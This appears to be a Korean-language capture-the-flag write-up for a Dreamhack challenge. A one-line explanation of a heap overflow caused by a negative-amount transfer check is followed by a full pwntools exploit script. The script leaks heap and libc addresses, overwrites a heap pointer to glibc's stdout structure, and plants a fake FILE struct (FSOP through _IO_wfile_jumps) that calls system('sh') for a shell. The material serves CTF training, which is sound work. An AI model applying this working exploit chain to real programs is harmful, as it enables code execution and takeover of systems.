transmit 할 때 돈을 먼저 보내고 음수체크를 해서 reading, writing size를 변경할 수 있고 heap overflow가 가능하다. heap에서 별걸 다 하므로 heap_base leak, FSOP를 진행해주면 된다.

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# p = process('./prob')
p = remote('host3.dreamhack.games', 9484)
l = ELF('./libc.so.6')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def _malloc():
    p.sendlineafter(b'> ', b'1')

def _transmit(idx1 : int, idx2 : int, money : int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx1).encode())
    p.sendlineafter(b': ', str(idx2).encode())
    p.sendlineafter(b': ', str(money).encode())

def _use_balance(idx : int, payload : bytes):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', payload)

def _delete_contract(idx : int):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b': ', str(idx).encode())
    p.recvuntil(b'data: ')
    return p.recvline()


for _ in range(0x10):
    _malloc()
for i in range(0x10 - 1, 0x8 - 1, -1):
    _delete_contract(i)
_transmit(1, 7, 0x200)
# gdb.attach(p)
dt = _delete_contract(7)[0x110:]
heap_base = u64(dt[:0x8]) << 12
l.address = u64(dt[0x28:0x30]) - (0x7f1995e87b20 - 0x7f1995c84000)
print(hex(heap_base))
print(hex(l.address))

_transmit(1, 5, 0x200)
_use_balance(5, b'a' * 0x108 + p64(0x21) + p64(0x300) + p64(l.sym['_IO_2_1_stdout_']))

fake_fsop_struct = l.sym['_IO_2_1_stdout_']
stdout_lock = l.address + (0x7f6effe32710 - 0x7f6effc2d000)
FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=stdout_lock,
    _wide_data=fake_fsop_struct - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
    _mode=0xFFFFFFFF,
)
_use_balance(6, FSOP)
p.interactive()
```